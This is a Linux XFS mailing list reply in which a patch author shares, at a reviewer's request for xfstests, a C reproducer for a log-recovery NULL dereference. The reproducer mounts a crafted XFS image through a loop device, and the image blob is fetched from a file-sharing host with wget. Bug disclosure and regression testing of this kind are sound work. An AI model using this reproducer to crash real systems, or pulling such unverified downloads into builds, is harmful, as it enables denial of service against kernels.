Received: from mail-pj1-f42.google.com (mail-pj1-f42.google.com [209.85.216.42])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D506425782D
	for <linux-xfs@vger.kernel.org>; Wed, 15 Jul 2026 01:02:42 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.216.42
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1784077368; cv=pass; b=Y7R7PoUn9sxJY75ZjqefXCmgLmxeuMU1dvfjhEr7Mc5GGI4B62dpScZZbJ89pmSo9YtogwFp7u98vgcgNGSW1MFNANjOPKsEVGEAqldrSUq5S7y5tGUr6jm8Ji4MwRrwChV7ui1neYdV+PYWjpS8fSrlYzQD95br6e25pOZBjWw=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1784077368; c=relaxed/simple;
	bh=UY7ubxjdQH0v34juZ27hcyC/XR1h8srcV8LlOOPc9wo=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=Roi0m88Qi8s1jLrOMhJcEGQuSlZrPkBAnckkAWXJA7vWowEnmLgqHqWuZ9WGy46tu7z+HCFWj2BrEmMqSIrCSjaZ0iLk1IaAomLKnSUEm42PASZLstNMnc1DBtHuB6VbRj35/W/VDE1WxYrgc2jUPjLS1juucB99nZ/sWw9yIDY=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=msAA0lln; arc=pass smtp.client-ip=209.85.216.42
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="msAA0lln"
Received: by mail-pj1-f42.google.com with SMTP id 98e67ed59e1d1-383b4a3755fso1473020a91.3
        for <linux-xfs@vger.kernel.org>; Tue, 14 Jul 2026 18:02:42 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1784077362; cv=none;
        d=google.com; s=arc-20260327;
        b=GrKmCe/mfGkVelfR4zOk2H5AtJ1Gq1c67ULk/kZnN/ABnb5KFzrntphvDlHfYpqeuE
         MGBltwE7qHWAgsC86kNy8kLzTTd/1Yn/8jlu/mzyyImv8C0Za2453lWf+hK2+6Guw3cR
         Fr0BFLugzz6lO7qCbBPwwtzs3/R2as7CyK77EdjZ4SrB4310ohBMKIUOgahoSQyGeAnT
         Buk1BnI8ULaySqPSpUUR5pu9NqsKc5Hc3ihFpcUYgBjsfiezTLvpmkpjl1VVaKsSjYrr
         AV0tSBT/WANOXqprHaIHAVCzv2AI6TLc9XpDPedGvgL/srp9jx8wHMvB4XgghfRzZeUP
         bgGw==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=ny+Y8aJedlosdwWq4xMtvdxX6hbxb2mSbZ1S3HF7xwE=;
        fh=YLKsVTe+jmYgZR3udSu1I+j1EMe+IQITeQfU0+6LnaU=;
        b=ZQ0dMAaAc6C2bI4WGLwQc0kY4ckDUCdSArXiAw1BczUSBqWGpfoRmWAFkjpu2tZJS7
         mOWM+xJXPv2APWgPXlXwQifsruDrC6BUjnhGUU6moD0BVdMLzfrNLPF1d8Z2/yD4anu0
         r0mJhEiJuDPSxfONQJZ9NM/i75FLn1ghQWZ0AXyhme55BXVHlaMM6jNQpPhRGHpSlSqU
         Wo9so3CX2HwS1PPeSUZCnR8XpPOa4NZfWsvfE1h8QsIPEZhwSjfC6vEVncuQ3LvnXDBI
         t+oRIzmHKHBdlO6wvptyy1KyJUwDxCYqYEvfokBhCRtJZ+iXlXATziCyj/BSOIaWPKh8
         ndNA==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1784077362; x=1784682162; darn=vger.kernel.org;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
         :date:message-id:reply-to:content-type;
        bh=ny+Y8aJedlosdwWq4xMtvdxX6hbxb2mSbZ1S3HF7xwE=;
        b=msAA0llnBJQmoWQXUwE67iiHKy37Bh93Lxc7F7RXimpWt1w6wpwuItk4LTtKp7yvlZ
         pE0wI7TzOQHBkpz8PSolHmlzNP66oVH8Ju8XE3+Cvk7he70sOwRknLKd0yB35eRgh1cy
         EqNf1xNzYnddc+g5i6CZ1ebun8VvWUpWFGWhqKme4uYDhxOGyk3tte4Py3Vkqk5QHXEU
         VDPXXyxMBcii+90iFm/jZ03mTG4F2JElCEric3VRDL1jkGqvDM0RT/IZfL81/Hb7Lza+
         orkXt3RIlmVx2T+lVqKuEOmzhIfCZTpw2tuR7tMsDvr/y3xZbWtERzd+0+zAqfIFhfNR
         nLig==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1784077362; x=1784682162;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:in-reply-to:references:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=ny+Y8aJedlosdwWq4xMtvdxX6hbxb2mSbZ1S3HF7xwE=;
        b=lZuRCUYg0bLwh6DaxrOc2ynVxytA6d8GNy88GA9gCiN/vBYJvfbd3+YaE/4iEx2rRL
         GtKTWGvH6ppVMMKkiCHSmSFNGIslU+fOmeU4oK0CY8t6njLEX8QLi7VGS1NJvKDElHbq
         EkOlbbe8ZBVaiZnEFtOm8OnGaxVBB1yQVp2SVc91e8BUDIDGiHQ/P4NFS5yxSIqdWb7j
         m3EsftkTOPuJ3MQlikTCZoDtHq6fpdNIzKL5AnxMsvTgHOvzcS6YJlDRnXDmdj5YOeyS
         o1CKFUNjDzy+XeYzlujkRI5R4okBqUTo+HYJBYo1PJ/jTlk2vIliVvJ8tHqX64RfBIxg
         U05A==
X-Forwarded-Encrypted: i=1; AHgh+RposrLDdJCDttHLIs6dhhIX8dPq3+TkjigutMqAuQ6Us4UwngxXb0JkRZFjlishehpD7lBr8uBy5+M=@vger.kernel.org
X-Gm-Message-State: AOJu0YyTIYwY7oM2zywOVh0atNUvj2bFOSDka5Fz5R/8hp0P8VXe0rwy
	QgCHv4uE+aPfTR6wfWE8kKbc67CJDdzX9UXb9UNEEGpN4n0XYL71YF/8kkIajgLA/e6dZWt6l0e
	00jsIHCcEWMa5hNWItGkPPk15lefvUd+zl4Ll7JOtZ51kvi+g142OVByjno8=
X-Gm-Gg: AfdE7cmdcjoSyQMzPVmPXN79N11dSyA/cClb7vIvOcpLjGGT8FfflAna9WAPeTwpiqy
	SlRUtKWDRgdplZ8VAvkDcZXGKeYL33rQiY2NxIKrOzEzyBNBzcn2XXCb7x3ZiL/ykUbHxbT8L3N
	R0mMKSLgBvBqq7LtMacOG+xPUBpfT7FcnXOFOR7x2WzZ27fmSZewZ+5F5ZxLBLsUqUUmeDOX55F
	leBfktqtm8/myJuiOJ1mzZ7XbRTMRAD0CvLWfBDjXEStDPTFQbWRsyVL04PKC2VmLglUzVJKB3b
	zNppdbcvAmOy1YjtUuR8knzFjWFw
X-Received: by 2002:a17:90b:3b89:b0:387:e0db:3fad with SMTP id
 98e67ed59e1d1-38dc7778aedmr13995855a91.38.1784077362264; Tue, 14 Jul 2026
 18:02:42 -0700 (PDT)
Precedence: bulk
X-Mailing-List: linux-xfs@vger.kernel.org
List-Id: <linux-xfs.vger.kernel.org>
List-Subscribe: <mailto:linux-xfs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-xfs+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20260712220854.3131445-1-xmei5@asu.edu> <alSr3bJ8yow3ID9K@infradead.org>
In-Reply-To: <alSr3bJ8yow3ID9K@infradead.org>
From: Xiang Mei <xmei5@asu.edu>
Date: Tue, 14 Jul 2026 18:02:31 -0700
X-Gm-Features: AUfX_mztmdkU4Yga2wpYw1HphT4cAw6HQeuWY0T733tvnEnUi6z4LwZd8K2vjbU
Message-ID: <CAPpSM+QN-6pgBYLfyYVmBr1b1gXsuOgTci-4V8qwd4wewzf4Mw@mail.gmail.com>
Subject: Re: [PATCH] xfs: reject log continuation for a header-only item in recovery
To: Christoph Hellwig <hch@infradead.org>
Cc: Carlos Maiolino <cem@kernel.org>, linux-xfs@vger.kernel.org, linux-kernel@vger.kernel.org, 
	bestswngs@gmail.com
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

On Mon, Jul 13, 2026 at 2:12=E2=80=AFAM Christoph Hellwig <hch@infradead.or=
g> wrote:
>
> On Sun, Jul 12, 2026 at 03:08:54PM -0700, Xiang Mei wrote:
> > On an XLOG_WAS_CONT_TRANS op, xlog_recover_add_to_cont_trans() extends =
the
> > tail item's last region via item->ri_buf[item->ri_cnt-1] without checki=
ng
> > that the item has one. A header-only item, created by
> > xlog_recover_add_to_trans() when a transaction's first op is a bare
> > sizeof(struct xfs_trans_header) op carrying XFS_TRANS_HEADER_MAGIC, sit=
s on
> > r_itemq with ri_cnt =3D=3D 0 and ri_buf =3D=3D NULL. A crafted log whos=
e ops are
> > XLOG_START_TRANS, that header op, then XLOG_WAS_CONT_TRANS thus
> > dereferences ((struct kvec *)NULL)[-1] and faults during mount(2) log
> > recovery of an untrusted XFS image.
> >
> > A valid XLOG_WAS_CONT_TRANS only follows a region written with
> > XLOG_CONTINUE_TRANS, so ri_cnt >=3D 1 always holds for a real log. Reje=
ct the
> > ri_cnt =3D=3D 0 case as corruption with -EFSCORRUPTED, which the caller=
 already
> > propagates to abort recovery.
>
> Looks good:
>
> Reviewed-by: Christoph Hellwig <hch@lst.de>
>
> Can you share your code to generate these malformed logs?  Because it
> would be really useful  to test these conditions regularly in xfstests..
>

Of course. Here is some information to reproduce the bug:

1. CONFIGS:
```
CONFIG_XFS_FS=3Dy
CONFIG_BLK_DEV_LOOP=3Dy
CONFIG_BLK_DEV_LOOP_MIN_COUNT=3D0
CONFIG_TMPFS=3Dy
CONFIG_KASAN=3Dy
CONFIG_KASAN_INLINE=3Dy
```

2. Reproducer (gcc ./exp.c -o ./exploit -lpthread -static -lz -w)
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/sysmacros.h>
#include <linux/loop.h>
#include <zlib.h>

#include "img_blob.h"

#define IMG_PATH  "/tmp/poc.img"
#define MNT_PATH  "/tmp/mnt"

static void die(const char *m) { perror(m); exit(1); }

static void inflate_image(void)
{
    unsigned char *out =3D malloc(IMG_ORIG_SIZE);
    if (!out) die("malloc");

    z_stream zs;
    memset(&zs, 0, sizeof(zs));
    zs.next_in =3D (unsigned char *)img_gz;
    zs.avail_in =3D img_gz_len;
    zs.next_out =3D out;
    zs.avail_out =3D IMG_ORIG_SIZE;

    if (inflateInit2(&zs, 15 + 16) !=3D Z_OK) die("inflateInit2");
    if (inflate(&zs, Z_FINISH) !=3D Z_STREAM_END) die("inflate");
    inflateEnd(&zs);

    int fd =3D open(IMG_PATH, O_RDWR | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) die("open img");
    if (write(fd, out, zs.total_out) !=3D (ssize_t)zs.total_out) die("write=
 img");
    close(fd);
    free(out);
}

int main(void)
{
    char loopdev[64];

    inflate_image();
    mkdir(MNT_PATH, 0755);

    int ctl =3D open("/dev/loop-control", O_RDWR);
    int devnr =3D ioctl(ctl, LOOP_CTL_GET_FREE);
    close(ctl);
    snprintf(loopdev, sizeof(loopdev), "/dev/loop%d", devnr);

    int filefd =3D open(IMG_PATH, O_RDWR);
    if (filefd < 0) die("open img for loop");

    int loopfd =3D open(loopdev, O_RDWR);
    if (loopfd < 0) die("open loopdev");
    if (ioctl(loopfd, LOOP_SET_FD, filefd) < 0) die("LOOP_SET_FD");
    close(filefd);

    mount(loopdev, MNT_PATH, "xfs", 0, "");

    umount(MNT_PATH);
    ioctl(loopfd, LOOP_CLR_FD, 0);
    close(loopfd);
    return 0;
}

```

Please compile after `wget https://filebin.net/68g43o706i6a5qw5/img_blob.h`
Please tell me if you need more information to reproduce the bug.

Xiang
